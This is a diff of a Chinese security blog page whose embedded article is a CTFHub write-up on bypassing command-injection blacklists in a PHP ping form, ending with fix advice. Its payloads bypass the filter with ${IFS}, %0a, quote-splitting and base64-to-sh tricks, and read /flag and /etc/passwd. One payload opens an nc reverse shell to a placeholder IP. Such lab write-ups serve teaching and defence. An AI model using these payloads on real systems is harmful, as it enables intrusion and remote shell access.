@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="auto">
 
-<head><script src="/san-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=san-blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>命令注入综合过滤绕过实战：从空格到管道的一条龙 | 东阳的安全笔记</title>
 <meta name="keywords" content="CTF, Web安全, 命令注入, RCE, 绕过, 黑名单">
 <meta name="description" content="题目信息
@@ -38,16 +38,16 @@ if (!preg_match_all(&#34;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&#34;, $ip, $m)) {
 1. 空格绕过：${IFS}
 ${IFS} 是 shell 的内置变量（Internal Field Separator），默认值包含空格、Tab、换行。在命令中可以直接代替空格。">
 <meta name="author" content="东阳">
-<link rel="canonical" href="http://localhost:1313/san-blog/posts/command-injection-filter-bypass/">
+<link rel="canonical" href="https://Samantha09.github.io/san-blog/posts/command-injection-filter-bypass/">
 <link crossorigin="anonymous" href="/san-blog/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/san-blog/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/san-blog/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/san-blog/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/san-blog/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/san-blog/safari-pinned-tab.svg">
+<link rel="icon" href="https://Samantha09.github.io/san-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Samantha09.github.io/san-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Samantha09.github.io/san-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://Samantha09.github.io/san-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://Samantha09.github.io/san-blog/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/san-blog/posts/command-injection-filter-bypass/">
+<link rel="alternate" hreflang="en" href="https://Samantha09.github.io/san-blog/posts/command-injection-filter-bypass/">
 <noscript>
     <style>
         #theme-toggle,
@@ -93,13 +93,94 @@ ${IFS} 是 shell 的内置变量（Internal Field Separator），默认值包含
         document.querySelector("html").dataset.theme = 'light';
     }
 
+</script><meta property="og:url" content="https://Samantha09.github.io/san-blog/posts/command-injection-filter-bypass/">
+  <meta property="og:site_name" content="东阳的安全笔记">
+  <meta property="og:title" content="命令注入综合过滤绕过实战：从空格到管道的一条龙">
+  <meta property="og:description" content="题目信息 类型：Web / 命令注入（Command Injection） 考点：黑名单过滤绕过、Shell 语法特性、编码与通配符 核心漏洞：exec() 直接拼接用户输入，黑名单过滤存在遗漏 源码分析 题目给了一段典型的命令注入代码，过滤规则逐步加强：
+第一版：只过滤 / if (!preg_match_all(&#34;/\//&#34;, $ip, $m)) { $cmd = &#34;ping -c 4 {$ip}&#34;; exec($cmd, $res); } 分析：只防了斜杠，但命令注入绝大多数情况下根本不需要 /。;id、$(id)、`id` 直接通杀。
+第二版：过滤 | 和 &amp; if (!preg_match_all(&#34;/(\||\&amp;)/&#34;, $ip, $m)) { exec(&#34;ping -c 4 {$ip}&#34;, $res); } 分析：禁了管道和后台执行，但 ; 完全没防，而且 $() 也无需任何分隔符。
+第三版：综合过滤（核心挑战） if (!preg_match_all(&#34;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&#34;, $ip, $m)) { $cmd = &#34;ping -c 4 {$ip}&#34;; exec($cmd, $res); } 黑名单：|、&amp;、;、空格、/、cat、flag、ctfhub
+绕过技巧拆解 1. 空格绕过：${IFS} ${IFS} 是 shell 的内置变量（Internal Field Separator），默认值包含空格、Tab、换行。在命令中可以直接代替空格。">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-06-09T01:00:00+08:00">
+    <meta property="article:modified_time" content="2026-06-09T01:00:00+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web安全">
+    <meta property="article:tag" content="命令注入">
+    <meta property="article:tag" content="RCE">
+    <meta property="article:tag" content="绕过">
+    <meta property="article:tag" content="黑名单">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="命令注入综合过滤绕过实战：从空格到管道的一条龙">
+  <meta name="twitter:description" content="题目信息 类型：Web / 命令注入（Command Injection） 考点：黑名单过滤绕过、Shell 语法特性、编码与通配符 核心漏洞：exec() 直接拼接用户输入，黑名单过滤存在遗漏 源码分析 题目给了一段典型的命令注入代码，过滤规则逐步加强：
+第一版：只过滤 / if (!preg_match_all(&#34;/\//&#34;, $ip, $m)) { $cmd = &#34;ping -c 4 {$ip}&#34;; exec($cmd, $res); } 分析：只防了斜杠，但命令注入绝大多数情况下根本不需要 /。;id、$(id)、`id` 直接通杀。
+第二版：过滤 | 和 &amp; if (!preg_match_all(&#34;/(\||\&amp;)/&#34;, $ip, $m)) { exec(&#34;ping -c 4 {$ip}&#34;, $res); } 分析：禁了管道和后台执行，但 ; 完全没防，而且 $() 也无需任何分隔符。
+第三版：综合过滤（核心挑战） if (!preg_match_all(&#34;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&#34;, $ip, $m)) { $cmd = &#34;ping -c 4 {$ip}&#34;; exec($cmd, $res); } 黑名单：|、&amp;、;、空格、/、cat、flag、ctfhub
+绕过技巧拆解 1. 空格绕过：${IFS} ${IFS} 是 shell 的内置变量（Internal Field Separator），默认值包含空格、Tab、换行。在命令中可以直接代替空格。">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Samantha09.github.io/san-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "命令注入综合过滤绕过实战：从空格到管道的一条龙",
+      "item": "https://Samantha09.github.io/san-blog/posts/command-injection-filter-bypass/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "命令注入综合过滤绕过实战：从空格到管道的一条龙",
+  "name": "命令注入综合过滤绕过实战：从空格到管道的一条龙",
+  "description": "题目信息 类型：Web / 命令注入（Command Injection） 考点：黑名单过滤绕过、Shell 语法特性、编码与通配符 核心漏洞：exec() 直接拼接用户输入，黑名单过滤存在遗漏 源码分析 题目给了一段典型的命令注入代码，过滤规则逐步加强：\n第一版：只过滤 / if (!preg_match_all(\u0026#34;/\\//\u0026#34;, $ip, $m)) { $cmd = \u0026#34;ping -c 4 {$ip}\u0026#34;; exec($cmd, $res); } 分析：只防了斜杠，但命令注入绝大多数情况下根本不需要 /。;id、$(id)、`id` 直接通杀。\n第二版：过滤 | 和 \u0026amp; if (!preg_match_all(\u0026#34;/(\\||\\\u0026amp;)/\u0026#34;, $ip, $m)) { exec(\u0026#34;ping -c 4 {$ip}\u0026#34;, $res); } 分析：禁了管道和后台执行，但 ; 完全没防，而且 $() 也无需任何分隔符。\n第三版：综合过滤（核心挑战） if (!preg_match_all(\u0026#34;/(\\||\u0026amp;|;| |\\/|cat|flag|ctfhub)/\u0026#34;, $ip, $m)) { $cmd = \u0026#34;ping -c 4 {$ip}\u0026#34;; exec($cmd, $res); } 黑名单：|、\u0026amp;、;、空格、/、cat、flag、ctfhub\n绕过技巧拆解 1. 空格绕过：${IFS} ${IFS} 是 shell 的内置变量（Internal Field Separator），默认值包含空格、Tab、换行。在命令中可以直接代替空格。\n",
+  "keywords": [
+    "CTF", "Web安全", "命令注入", "RCE", "绕过", "黑名单"
+  ],
+  "articleBody": "题目信息 类型：Web / 命令注入（Command Injection） 考点：黑名单过滤绕过、Shell 语法特性、编码与通配符 核心漏洞：exec() 直接拼接用户输入，黑名单过滤存在遗漏 源码分析 题目给了一段典型的命令注入代码，过滤规则逐步加强：\n第一版：只过滤 / if (!preg_match_all(\"/\\//\", $ip, $m)) { $cmd = \"ping -c 4 {$ip}\"; exec($cmd, $res); } 分析：只防了斜杠，但命令注入绝大多数情况下根本不需要 /。;id、$(id)、`id` 直接通杀。\n第二版：过滤 | 和 \u0026 if (!preg_match_all(\"/(\\||\\\u0026)/\", $ip, $m)) { exec(\"ping -c 4 {$ip}\", $res); } 分析：禁了管道和后台执行，但 ; 完全没防，而且 $() 也无需任何分隔符。\n第三版：综合过滤（核心挑战） if (!preg_match_all(\"/(\\||\u0026|;| |\\/|cat|flag|ctfhub)/\", $ip, $m)) { $cmd = \"ping -c 4 {$ip}\"; exec($cmd, $res); } 黑名单：|、\u0026、;、空格、/、cat、flag、ctfhub\n绕过技巧拆解 1. 空格绕过：${IFS} ${IFS} 是 shell 的内置变量（Internal Field Separator），默认值包含空格、Tab、换行。在命令中可以直接代替空格。\n# 正常 cat /flag # 绕过 cat${IFS}/flag $(ping${IFS}127.0.0.1) 变体：$IFS$9（末尾加 $9 第九个参数，通常为空，防止变量粘连）。\n2. 命令分隔符绕过：%0a（换行） ; 被过滤后，可以用 URL 编码的换行符 %0a 作为命令分隔符：\n?ip=127.0.0.1%0aid 等效于 127.0.0.1;id。shell 会把换行当作新的命令行处理。\n3. 管道/逻辑符绕过：$() 与反引号 | 和 \u0026 被禁后，不需要用它们来连接命令。$() 和 ` 自带命令执行环境：\n$(id) $(tac${IFS}/flag) `whoami` 4. 关键字绕过：单引号拆词 如果 cat 被过滤，可以用单引号将字符串隔断，shell 拼接后仍是原命令：\nca''t${IFS}/flag # 等效于 cat /flag ta''c${IFS}/flag # 等效于 tac /flag 原理：preg_match 匹配的是连续子串 cat，ca''t 中不存在连续的 cat。\n5. 文件名绕过：变量拼接与通配符 flag 被过滤后，可以利用 shell 变量展开或通配符匹配：\n变量拼接（推荐，精确可控）：\nfl${a}ag_1408529428232.php # $a 未定义时展开为：flag_1408529428232.php ⚠️ 注意变量边界：必须写成 ${a}，不能写 fl$ag_is_here，否则 shell 会把 $ag_is_here 当成一个完整变量名，展开后变成 fl。\n通配符匹配：\nfl*g_1408529428232.php # * 匹配任意字符 fl?g_1408529428232.php # ? 匹配单个字符 6. 路径绕过：cd 相对路径 / 被过滤后，无法直接写绝对路径。利用 cd .. 逐层返回根目录，再用相对路径进入目标目录：\ncd ..;cd ..;cd ..;cd etc;tac passwd 结合 %0a 分隔和 ${IFS} 代替空格：\n?ip=%0acd${IFS}..%0acd${IFS}..%0acd${IFS}..%0atac${IFS}fl?g 7. 编码绕过：base64 如果目标命令必须包含被禁字符（如路径中的 /），可以把整个命令 base64 编码后解码执行：\n# 原命令：tac /flag echo -n 'tac /flag' | base64 # 结果：dGFjIC9mbGFn Payload：\n$(echo${IFS}dGFjIC9mbGFn|base64${IFS}-d|sh) 8. 无管道 base64 执行 如果 | 也被过滤，管道链 |base64 -d|sh 无法使用。改用文件重定向 + 换行分批执行：\necho cGluZyAxMjcuMC4wLjE=\u003ea # 写入 base64 字符串 base64 -d a \u003e b # 解码为脚本文件 b sh b # 执行 URL 编码后：\n?ip=echo${IFS}cGluZyAxMjcuMC4wLjE=\u003ea%0abase64${IFS}-d${IFS}a\u003eb%0ash${IFS}b 全程无 |、无 ;、无空格、无 /、无 cat。\n完整利用示例 场景：读取 /flag 环境：过滤 | \u0026 ; 空格 / cat flag ctfhub，无回显。\nPayload（变量拼接 + tac + cd）：\n?ip=$(cd${IFS}..;cd${IFS}..;cd${IFS}..;tac${IFS}fl${a}ag) Payload（进入子目录读取 flag 文件）：\n?ip=127.0.0.1%0acd${IFS}fl${a}ag_is_here%0aca''t${IFS}fl${a}ag_275201643230443.php 解析：\n127.0.0.1：让前面的 ping 正常执行 %0a：换行分隔，代替 ; cd${IFS}fl${a}ag_is_here：${IFS} 代替空格，${a} 为空，展开为 cd flag_is_here ca''t：单引号拆词绕过 cat 过滤 fl${a}ag_275201643230443.php：变量拼接绕过 flag 过滤 Payload（base64 + 写文件）：\n# 先把结果写入 web 目录便于访问 # 原命令：tac /flag \u003e /var/www/html/a.txt # base64：dGFjIC9mbGFnID4gL3Zhci93d3cvaHRtbC9hLnR4dA== ?ip=$(echo${IFS}dGFjIC9mbGFnID4gL3Zhci93d3cvaHRtbC9hLnR4dA==|base64${IFS}-d|sh) 场景：反弹 Shell 如果 nc 存在，且过滤了 /，可以用 cd 配合或直接写无 / 的 payload：\n$(nc${IFS}-e${IFS}sh${IFS}你的IP${IFS}4444) 如果 /dev/tcp 被限制，用 base64 打包一个完整的 bash 反弹命令解码执行。\n实战截图 下图为 CTFHub 综合过滤练习的实际利用过程。Payload 中同时使用了 %0a 换行分隔、${IFS} 代替空格、ca''t 绕过 cat 关键字、${a} 分割 flag 字符串，最终在响应中回显了 flag。\n踩坑记录 变量边界问题：fl$ag_is_here 会被解析为变量 $ag_is_here，而不是 $a + g_is_here。必须用 ${a} 明确分隔。\ncd 失败后命令仍在原目录：如果 cd 的目标目录不存在，shell 不会切换目录，后续命令仍在原位置执行。\n通配符匹配多个文件：fl*g 如果匹配到多个文件（如 flag 和 flg），cat 会报错。变量拼接更稳妥。\n无回显不等于没执行：exec($cmd, $res) 的结果存在 $res 数组里，页面如果没打印就看不到。先用 sleep 5 或 DNSLog 盲打确认漏洞存在。\n修复建议 永远不要直接拼接用户输入到系统命令 使用 escapeshellarg() 包裹参数 白名单校验：如 filter_var($ip, FILTER_VALIDATE_IP) 尽量避免调用系统命令，使用原生函数（如 PHP 的 socket_create()）替代 ping 参考 PHP escapeshellarg 文档 POSIX Shell 变量展开规则 CTFHub 技能树 / Web / RCE ",
+  "wordCount" : "383",
+  "inLanguage": "en",
+  "datePublished": "2026-06-09T01:00:00+08:00",
+  "dateModified": "2026-06-09T01:00:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "东阳"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Samantha09.github.io/san-blog/posts/command-injection-filter-bypass/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "东阳的安全笔记",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Samantha09.github.io/san-blog/favicon.ico"
+    }
+  }
+}
 </script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="header-nav">
         <div class="logo">
-            <a href="http://localhost:1313/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
+            <a href="https://Samantha09.github.io/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
             <div class="logo-switches">
                 <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
@@ -125,27 +206,27 @@ ${IFS} 是 shell 的内置变量（Internal Field Separator），默认值包含
         </div>
         <ul id="menu" class="menu">
             <li>
-                <a href="http://localhost:1313/san-blog/" title="首页">
+                <a href="https://Samantha09.github.io/san-blog/" title="首页">
                     <span>首页</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/posts/" title="文章">
+                <a href="https://Samantha09.github.io/san-blog/posts/" title="文章">
                     <span>文章</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/tags/" title="标签">
+                <a href="https://Samantha09.github.io/san-blog/tags/" title="标签">
                     <span>标签</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/categories/" title="分类">
+                <a href="https://Samantha09.github.io/san-blog/categories/" title="分类">
                     <span>分类</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/archives/" title="归档">
+                <a href="https://Samantha09.github.io/san-blog/archives/" title="归档">
                     <span>归档</span>
                 </a>
             </li>
@@ -325,19 +406,19 @@ ${IFS} 是 shell 的内置变量（Internal Field Separator），默认值包含
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/san-blog/tags/ctf/">CTF</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">命令注入</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/rce/">RCE</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/%E7%BB%95%E8%BF%87/">绕过</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/%E9%BB%91%E5%90%8D%E5%8D%95/">黑名单</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/ctf/">CTF</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">命令注入</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/rce/">RCE</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/%E7%BB%95%E8%BF%87/">绕过</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/%E9%BB%91%E5%90%8D%E5%8D%95/">黑名单</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/san-blog/posts/ctfhub-ssrf-gopher-post-exploit/">
+  <a class="prev" href="https://Samantha09.github.io/san-blog/posts/ctfhub-ssrf-gopher-post-exploit/">
     <span class="title">« Prev</span>
     <span>CTFHub SSRF 实战：Gopher 协议构造 POST 请求绕过本地限制</span>
   </a>
-  <a class="next" href="http://localhost:1313/san-blog/posts/ctfhub-rfi-shell/">
+  <a class="next" href="https://Samantha09.github.io/san-blog/posts/ctfhub-rfi-shell/">
     <span class="title">Next »</span>
     <span>CTFHub RFI 远程文件包含漏洞利用详解</span>
   </a>
@@ -348,7 +429,7 @@ ${IFS} 是 shell 的内置变量（Internal Field Separator），默认值包含
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/san-blog/">东阳的安全笔记</a></span> · 
+        <span>&copy; 2026 <a href="https://Samantha09.github.io/san-blog/">东阳的安全笔记</a></span> · 
 
     
     
